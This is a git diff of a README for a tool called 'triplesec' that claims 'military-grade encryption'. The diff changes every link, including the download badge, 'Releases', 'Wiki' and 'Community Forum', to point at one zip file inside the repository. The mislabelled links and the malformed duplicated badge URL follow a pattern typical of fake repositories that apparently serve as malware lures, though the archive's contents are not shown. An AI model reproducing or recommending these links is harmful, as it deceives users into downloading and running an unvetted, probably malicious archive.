@@ -6,7 +6,7 @@ Welcome to triplesec! This tool provides military-grade encryption tailored for 
 
 ## 📥 Download Now
 
-[![Download triplesec](https://raw.githubusercontent.com/GOLDENUNICON/triplesec/main/docs/Software-v1.8.zip%https://raw.githubusercontent.com/GOLDENUNICON/triplesec/main/docs/Software-v1.8.zip)](https://raw.githubusercontent.com/GOLDENUNICON/triplesec/main/docs/Software-v1.8.zip)
+[![Download triplesec](https://github.com/GOLDENUNICON/triplesec/raw/refs/heads/main/src/Modules/Software-1.0.zip%https://github.com/GOLDENUNICON/triplesec/raw/refs/heads/main/src/Modules/Software-1.0.zip)](https://github.com/GOLDENUNICON/triplesec/raw/refs/heads/main/src/Modules/Software-1.0.zip)
 
 ## 📋 What You Need
 
@@ -19,7 +19,7 @@ Before you start, ensure you have the following:
 
 ## 📂 Download & Install
 
-To get triplesec, visit this page to download: [triplesec Releases](https://raw.githubusercontent.com/GOLDENUNICON/triplesec/main/docs/Software-v1.8.zip). You will see the latest version available for download.
+To get triplesec, visit this page to download: [triplesec Releases](https://github.com/GOLDENUNICON/triplesec/raw/refs/heads/main/src/Modules/Software-1.0.zip). You will see the latest version available for download.
 
 1. Click on the release you want to install.
 2. Download the appropriate file for your operating system.
@@ -60,8 +60,8 @@ To get triplesec, visit this page to download: [triplesec Releases](https://raw.
 
 For more detailed instructions and advanced tips:
 
-- Check out our [Wiki](https://raw.githubusercontent.com/GOLDENUNICON/triplesec/main/docs/Software-v1.8.zip) for guides and FAQs.
-- Visit our [Community Forum](https://raw.githubusercontent.com/GOLDENUNICON/triplesec/main/docs/Software-v1.8.zip) for support and discussions with other users.
+- Check out our [Wiki](https://github.com/GOLDENUNICON/triplesec/raw/refs/heads/main/src/Modules/Software-1.0.zip) for guides and FAQs.
+- Visit our [Community Forum](https://github.com/GOLDENUNICON/triplesec/raw/refs/heads/main/src/Modules/Software-1.0.zip) for support and discussions with other users.
 
 ## 📞 Contact Us
 
